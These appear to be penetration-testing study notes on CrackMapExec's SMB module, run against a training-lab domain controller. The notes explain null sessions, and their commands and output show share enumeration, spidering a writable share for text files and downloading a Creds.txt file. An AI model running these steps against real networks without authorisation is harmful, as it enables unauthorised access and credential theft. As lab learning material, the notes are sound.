## CrackMapExec

### SMB module

Basic Reconnaissance

The SMB protocol is adventangeous for recon against Windows target machine
without authentication we can retrieve all kinds of information.



Exploiting Null/Anonymous Sessions

A Null Session is an anonymous connection to an inter-process communication network service on Windows-based computers. the service is designed to allow named pipe connections but may be used by attackers to gather information about the system remotely.


When a target is vulnerable tu a Null Sesion, especifically a domain controller, it will allow the attacker to gather information without having a valid domain account such as:


Domain users (--users)
Domain groups (--groups)
Password policy (--pass-pol)
Share folders (--shares)





## Spidering and geting juicy information

Using the spidering module

```bash
❯ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --shares
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
SMB         10.129.204.177  445    DC01             [*] Enumerated shares
SMB         10.129.204.177  445    DC01             Share           Permissions     Remark
SMB         10.129.204.177  445    DC01             -----           -----------     ------
SMB         10.129.204.177  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.204.177  445    DC01             C$                              Default share
SMB         10.129.204.177  445    DC01             CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.204.177  445    DC01             D$                              Default share
SMB         10.129.204.177  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.204.177  445    DC01             IT              READ,WRITE
SMB         10.129.204.177  445    DC01             K$                              Default share
SMB         10.129.204.177  445    DC01             linux01         READ,WRITE
SMB         10.129.204.177  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.204.177  445    DC01             serviceaccount
SMB         10.129.204.177  445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.204.177  445    DC01             Users           READ

```


Now searching over one the shares that we can Read and Write, if some files are located on it
like a ".txt" file or stuffs like that
```

❯ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --pattern txt
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
SMB         10.129.204.177  445    DC01             [*] Started spidering
SMB         10.129.204.177  445    DC01             [*] Spidering .
SMB         10.129.204.177  445    DC01             //10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 08:01' size:54]
SMB         10.129.204.177  445    DC01             //10.129.204.177/IT/IPlist.txt [lastm:'2022-12-01 08:01' size:36]
SMB         10.129.204.177  445    DC01             //10.129.204.177/IT/Documents/PCNames.txt [lastm:'2022-12-01 08:01' size:22]
SMB         10.129.204.177  445    DC01             [*] Done spidering (Completed in 1.292881727218628)
❯ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt creds.txt
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
SMB         10.129.204.177  445    DC01             [*] Copying "Creds.txt" to "creds.txt"
SMB         10.129.204.177  445    DC01             [+] File "Creds.txt" was downloaded to "creds.txt"
```
